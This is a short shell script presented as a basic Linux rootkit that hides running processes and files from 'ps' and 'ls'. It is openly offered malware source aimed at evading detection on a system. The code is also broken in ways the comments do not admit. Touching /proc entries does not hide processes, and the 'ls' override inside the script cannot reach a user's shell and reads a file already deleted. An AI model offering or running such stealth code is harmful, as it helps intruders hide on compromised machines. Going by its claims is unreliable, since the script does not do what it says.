#!/bin/sh

# This is a basic example of a Linux rootkit written in bash.
# It hides processes and files, making it harder to detect.

# Function to hide processes from the ps command
hide_processes() {
    # Create a temporary file for storing the list of hidden PIDs
    TEMP_FILE=$(mktemp)
    
    # List all running processes (excluding the current shell process PID)
    pids=$(ps -eo pid | grep -v $$)

    # Loop through each PID and add it to the temp file
    echo "$pids" > $TEMP_FILE

    # Override /proc/PID/cmdline with empty files for hidden PIDs
    while read -r pid; do
        touch "/proc/$pid/cmdline"
    done < $TEMP_FILE
    
    # Clean up temporary file after hiding processes
    rm $TEMP_FILE
}

# Function to hide files from the ls command
hide_files() {
    # Create a temporary file for storing the list of hidden filenames
    TEMP_FILE=$(mktemp)

    # List all regular files in / (excluding this script and hidden PID files)
    echo "$(find / -type f | grep -v /$0 | grep -v /proc/[0-9]*/cmdline)" > $TEMP_FILE

    # Override the results of 'ls' with hidden filenames
    ls () {
        cat "$TEMP_FILE"
    }
    
    # Clean up temporary file after hiding files
    rm $TEMP_FILE
}

# Call both functions to hide processes and files
hide_processes
hide_files
